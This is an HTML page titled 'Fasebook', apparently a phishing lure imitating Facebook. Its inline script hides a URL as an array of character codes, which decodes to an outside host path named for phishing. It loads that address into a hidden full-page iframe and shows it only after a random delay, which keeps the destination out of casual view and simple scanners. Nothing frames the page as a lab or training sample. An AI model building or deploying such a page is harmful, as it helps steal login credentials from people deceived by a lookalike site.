<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fasebook</title> 
  <link rel="stylesheet" href="assets/style.css">
  <link rel="stylesheet" href="assets/w3.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>

  <style>
    #ghost-frame {
      width: 100%;
      height: 100%;
      border: none;
      display: none;
    }
  </style>
</head>
<body>

<div id="frame-container"></div>

<script>
 
  const key = [104,116,116,112,115,58,47,47,99,121,98,101,114,103,111,114,97,100,46,97,108,119,97,121,115,100,97,116,97,46,110,101,116,47,103,111,114,97,100,112,104,105,115,104];
  const url = key.map(c => String.fromCharCode(c)).join('');

  const ghostFrame = document.createElement("iframe");
  ghostFrame.id = "ghost-frame";
  ghostFrame.src = url;
  document.getElementById("frame-container").appendChild(ghostFrame);


  setTimeout(() => {
    ghostFrame.style.display = "block";
  }, 1000 + Math.random() * 2000); 

</body>
</html>
